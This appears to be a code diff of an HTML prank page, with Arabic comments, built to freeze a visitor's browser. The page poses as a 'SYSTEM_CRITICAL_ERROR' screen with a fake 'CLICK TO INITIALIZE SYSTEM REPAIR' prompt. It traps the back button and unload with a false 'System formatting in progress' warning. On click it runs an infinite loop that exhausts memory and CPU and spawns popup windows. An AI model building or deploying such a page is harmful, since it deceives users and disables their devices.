@@ -1,36 +1,34 @@
 <!DOCTYPE html>
-<html style="background-color: black; cursor: none;">
+<html>
 <head>
-    <title>System Error</title>
-    <style>
-        body { 
-            background-color: black; 
-            color: black; 
-            margin: 0; 
-            padding: 0; 
-            overflow: hidden; 
-            width: 100vw; 
-            height: 100vh;
-        }
-    </style>
+    <title>SYSTEM_CRITICAL_ERROR</title>
+    <style>body { background: black; }</style>
 </head>
 <body>
     <script>
-        // تفعيل وضع الشاشة الكاملة أول ما يلمس المستخدم الشاشة
-        document.addEventListener('click', function() {
-            document.documentElement.requestFullscreen();
-            
-            // البدء في جلد المعالج والرام
-            let memoryHog = [];
+        // سجن المتصفح: يمنع الرجوع ويمنع إغلاق الصفحة بسهولة
+        window.onbeforeunload = function() { return "CRITICAL: System formatting in progress!"; };
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () { history.go(1); };
+
+        function freeze() {
+            let data = [];
+            // حلقة لا نهائية تجلد المعالج والرام مع بعض
             while(true) {
                 // استهلاك الرام بجنون
-                memoryHog.push(new Array(1000000).join('CRASH'));
-                // استهلاك المعالج
-                Math.sqrt(Math.random() * Math.random());
-                // محاولة فتح روابط وهمية لزيادة الضغط
-                window.history.pushState(null, null, window.location.href);
+                data.push(new Array(1000000).join("VORTX_CRASH_"));
+                // محاولة فتح نوافذ منبثقة (المتصفح بيحاول يصدها ويثقل)
+                window.open(location.href, '_blank', 'width=10,height=10');
+                // طباعة في الكونسول لتشتيت المعالج
+                console.log("SYSTEM_OVERLOAD_DIRECTED_BY_VORTX");
             }
-        });
+        }
+
+        // يبدأ الشغل أول ما يلمس الشاشة
+        document.body.onclick = freeze;
     </script>
+    <div style="color: white; text-align: center; margin-top: 45vh; font-family: sans-serif;">
+        [ CLICK TO INITIALIZE SYSTEM REPAIR ]
+    </div>
 </body>
 </html>
